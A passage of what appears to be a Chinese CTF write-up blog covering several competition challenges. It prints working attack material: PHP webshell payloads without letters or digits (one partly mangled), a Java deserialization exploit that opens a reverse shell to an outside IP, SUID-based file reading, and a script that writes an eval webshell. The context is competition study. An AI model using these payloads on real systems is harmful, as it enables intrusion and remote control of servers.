class="keyword">case</span> <span class="string">&quot;get&quot;</span>:</span><br><span class="line">            <span class="variable">$get</span> = <span class="keyword">new</span> <span class="title class_">Get</span>(<span class="variable">$parsed_url</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$get</span>-&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;put&quot;</span>:</span><br><span class="line">            <span class="variable">$put</span> = <span class="keyword">new</span> <span class="title class_">Put</span>(<span class="variable">$parsed_url</span>[<span class="number">1</span>], <span class="variable">$_POST</span>);</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$put</span>-&gt;<span class="title function_ invoke__">put</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$data</span> = [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;Invalid data.&quot;</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212210854.png" alt="image.png"></p>
<p>此时虽然成功绕过,但是最后包含的是<code>@include(&quot;./files/&quot; . $this-&gt;filename);</code><br>而<code>1\</code>这个文件本来是不存在的,读取内容也就是空</p>
<p>然后就是这题的一个特性了: 这题环境是Windows系统,windows下使用<strong>FindFirstFile</strong>这个API（执行<strong>include</strong>，<strong>file_get_contents</strong>）时，有一个trick：会把双引号字符<code>&quot;</code>解释为点字符<code>.</code></p>
<p>还是先写一个1文件<br>此时我们再读<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212211633.png" alt="image.png"><br>发现成功包含,然后就是绕过code_sanitizer()函数写木马了,这里是无字母数字rce</p>
<p>这里有个坑是我一直想构造类似<code>$_POST[_]($_POST[__])</code>这种形式的执行命令:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=$_=&#x27;&#x27;.[];$_=$_[&#x27;_&#x27;];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=++$_;$__=++$_;$_++;$_++;$____=++$_;$_____=++$_;$_=_.$__.$___.$____.$_____;$$_[_]($$_[__]);?&gt;</span><br></pre></td></tr></table></figure><br>但是执行失败<br>我们直接构造readfile(‘flag.php’);<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=$_=[];$_=&quot;$_&quot;;$_=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quotx27;.&#x27;.$____.$_____.$____;$__($___);?&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212231716.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212231657.png" alt="image.png"></p>
<p>这里踩的一个坑是url编码,如果想要在burp里执行写文件的操作时,content需要url编码一下才可以,或者直接hackbar传参,本地是一下可以发现写入文件的结果是<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=$_=[];$_=&quot;$_&quot;;$_=$_[(&quot;!&quot;==&quot;!&quot;)*Nope*(&quot;!&quot;==&quot;!&quot;)*Nope*(&quot;!&quot;==&quot;!&quot;)];$__=$_;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$__*Nope**Nope*;$___=$_;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$____=$_;$_____=$_;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$______=$_;$______*Nope**Nope*;$______*Nope**Nope*;$______*Nope**Nope*;$______*Nope**Nope*;$______*Nope**Nope*;$__=$__.$___.$____.$_____.$______;$___=$_;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$____=$_;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$_____=$_;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$__=$__.$___.$____.$_____;$___=$_;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$___*Nope**Nope*;$____=$_;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$_____=$_;$______=$_;$______*Nope**Nope*;$______*Nope**Nope*;$______*Nope**Nope*;$______*Nope**Nope*;$______*Nope**Nope*;$______*Nope**Nope*;$___=$___.$____.$_____.$______;$____=$_;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$____*Nope**Nope*;$_____=$_;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$_____*Nope**Nope*;$___=$___.&#x27;.&#x27;.$____.$_____.$____;$__($___);?&gt;</span><br></pre></td></tr></table></figure><br>这里+被当成了空格从而导致被替换了,所以在burp写文件时需要url编码</p>
<p>参考:<br><a href="https://nikoeurus.github.io/2019/11/04/lfi2019/#lfi2019">https://nikoeurus.github.io/2019/11/04/lfi2019/#lfi2019</a></p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>2023柏鹭杯</title>
    <url>/2024/02/06/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    <content><![CDATA[<p>有点菜,做了2个签到web,<a href="https://captainruler.github.io/">22mu师傅</a>做了一个re和一个misc</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="express-fs"><a href="#express-fs" class="headerlink" title="express fs"></a>express fs</h3><p>?file=main.js读main.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"> <span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"> <span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">80</span>; </span><br><span class="line"> app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>)) </span><br><span class="line"> app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; <span class="keyword">if</span> ([req.<span class="property">body</span>, req.<span class="property">headers</span>, req.<span class="property">query</span>].<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>))) &#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;臭黑客!&quot;</span>); </span><br><span class="line">&#125; <span class="title function_">next</span>(); &#125;); </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="keyword">try</span> &#123; res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"> res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">file</span> || <span class="string">&quot;index.html&quot;</span>).<span class="title function_">toString</span>()); &#125; </span><br><span class="line"> <span class="keyword">catch</span> (err) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">     res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>); &#125; &#125;); app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`express server listening on port <span class="subst">$&#123;PORT&#125;</span>`</span>)); </span><br></pre></td></tr></table></figure></p>
<p>过滤关键词flag,其他文件随便读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file[href]=a&amp;file[origin]=1&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fl%2561g.txt</span><br></pre></td></tr></table></figure>
<p>参考:<a href="https://cloud.tencent.com/developer/article/2123023">https://cloud.tencent.com/developer/article/2123023</a><br>猜的当前位置的flag.txt<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ISEC-fc2de1cc55f330ec11a8bb2a3424590b&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="综合题5"><a href="#综合题5" class="headerlink" title="综合题5"></a>综合题5</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://8.130.140.124:51180/readfile?filename=../../app/demo.jar</span><br></pre></td></tr></table></figure>
<p>gpt写解密:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">enc_flag1</span> <span class="operator">=</span> <span class="string">&quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">O0O</span> <span class="operator">=</span> <span class="string">&quot;6925cc02789c1d2552b71acc4a2d48fd&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">o0o</span><span class="params">(String Ooo)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">oOo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">OO0</span> <span class="operator">=</span> Ooo.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">o0O</span> <span class="operator">=</span> <span class="number">0</span>; o0O &lt; OO0; o0O++) &#123;</span><br><span class="line">            oOo.append((<span class="type">char</span>) (Ooo.charAt(o0O) ^ <span class="built_in">this</span>.O0O.charAt(o0O % <span class="built_in">this</span>.O0O.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(oOo.toString().getBytes());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decrypt</span><span class="params">(String encryptedData)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] decodedBytes = Base64.getDecoder().decode(encryptedData);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">decryptedText</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; decodedBytes.length; i++) &#123;</span><br><span class="line">            decryptedText.append((<span class="type">char</span>) (decodedBytes[i] ^ <span class="built_in">this</span>.O0O.charAt(i % <span class="built_in">this</span>.O0O.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decryptedText.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">test1</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test1</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解密加密字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encryptedInput</span> <span class="operator">=</span> obj.enc_flag1;</span><br><span class="line">        <span class="type">String</span> <span class="variable">decryptedResult</span> <span class="operator">=</span> obj.decrypt(encryptedInput);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Decrypted result: &quot;</span> + decryptedResult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ISEC-52e353a950c752b3dc8f0d1c949f0361&#125;</span><br></pre></td></tr></table></figure>
<h3 id="综合题6"><a href="#综合题6" class="headerlink" title="综合题6"></a>综合题6</h3><p>沙雕电子技术基础实验,浪费三个多小时,不然这题能交的</p>
<p>jadx反编译查看Upload.java,发现一个路由<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123;&quot;/internalApi/v3.2/updateConfig&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">syncData</span><span class="params">(<span class="meta">@RequestBody</span> String payload)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(payload))).readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Data synced successfully&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Failed to sync data: &quot;</span> + e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这里可以直接post payload<br>Ping.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: Ping.class */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ping</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line">    <span class="keyword">private</span> String arg1;</span><br><span class="line">    <span class="keyword">private</span> String arg2;</span><br><span class="line"></span><br><span class="line">    Ping() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCommand</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.command = command;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setArg1</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.arg1 = arg1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setArg2</span><span class="params">(String arg2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.arg2 = arg2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="built_in">this</span>.command, <span class="built_in">this</span>.arg1, <span class="built_in">this</span>.arg2&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>基础的反序列化<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: Ping.class */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ping</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line">    <span class="keyword">private</span> String arg1;</span><br><span class="line">    <span class="keyword">private</span> String arg2;</span><br><span class="line"></span><br><span class="line">    Ping() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCommand</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.command = command;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setArg1</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.arg1 = arg1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setArg2</span><span class="params">(String arg2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.arg2 = arg2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="built_in">this</span>.command, <span class="built_in">this</span>.arg1, <span class="built_in">this</span>.arg2&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Ping ping=<span class="keyword">new</span> <span class="title class_">Ping</span>();</span><br><span class="line">        ping.setCommand(<span class="string">&quot;bash&quot;</span>);</span><br><span class="line">        ping.setArg1(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">        ping.setArg2(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/111.229.158.40/2222 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(ping);</span><br><span class="line">        String res= Base64.getEncoder().encodeToString(bos.toByteArray());</span><br><span class="line">        System.out.println(res);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>Upload目录里有hint.txt,flag在/root/flag2<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">dig -f /root/flag2</span><br></pre></td></tr></table></figure><br>得到flag2</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>每行空格个数的ASCII组合一起<br><img src="https://s2.loli.net/2023/10/12/WS2poJiL7zbd4K3.jpg" alt="1.jpg"></p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p><img src="https://s2.loli.net/2023/10/12/J3mvYRN7HodZa8I.png" alt="image-20231012103158670.png"></p>
<p><img src="https://s2.loli.net/2023/10/12/6sokbxYwacyPi3K.png" alt="image-20231012103510111.png"></p>
<p><img src="https://s2.loli.net/2023/10/12/5W7hnlmMvtZYPG8.png" alt="image-20231012104011950.png"></p>
<p><img src="https://s2.loli.net/2023/10/12/BO26yXdxosKRcTr.png" alt="image-20231012104914540.png"></p>
<p><img src="https://s2.loli.net/2023/10/12/QB2SeMKvwL1fGn9.png" alt="image-20231012104002124.png"><br><img src="https://s2.loli.net/2023/10/12/i7htFxupP12XTDH.png" alt="image-20231012103953758.png"></p>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2023第六届安洵杯</title>
    <url>/2024/02/06/2023%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
    <content><![CDATA[<h3 id="what’s-my-name"><a href="#what’s-my-name" class="headerlink" title="what’s my name"></a>what’s my name</h3><p>源码忘存了,就记得几个绕过</p>
<ul>
<li>正则直接include%0a绕过</li>
<li>create_function直接搜文章<code>%27%22]);&#125;phpinfo();/*</code>绕过</li>
<li>这里强比较可以本地调试,发现是字符串类型,直接传参就行,注意lambda前面有个不可见字符我们用%00表示</li>
<li>这里的lambda每次都会加1,这是php的特性,只有php重启才会重新变回1,我一开始是构造好payload手点73下发现无法写马成功,可能环境问题,后来还是写脚本爆了<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line">url = <span class="string">&#x27;http://47.108.206.43:43036/?d0g3=include%0a%27%22]);&#125;file_put_contents(&quot;zoe.php&quot;,&quot;&lt;?php+eval(\$_POST[1]);?&gt;&quot;);/*&amp;name=%00lambda_73&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(res.status_code)</span><br><span class="line">    url2 = <span class="string">&quot;http://47.108.206.43:43036/zoe.php&quot;</span></span><br><span class="line">    res2 = requests.get(url=url2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res2.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1111111&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Good</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$g1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$gg2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ggg3</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gg2 = <span class="variable">$ggg3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="variable">$this</span>-&gt;gg2))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;gg2)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;g1-&gt;g1=<span class="number">666</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Luck</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ll2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$md5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lll3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;md5 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span>-&gt;l1;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ll2-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md5)) == <span class="number">666</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;There is noting&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">To</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tt2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$this</span>-&gt;arg1)===<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;arg1))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;tt2-&gt;tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;what are you doing?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">You</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 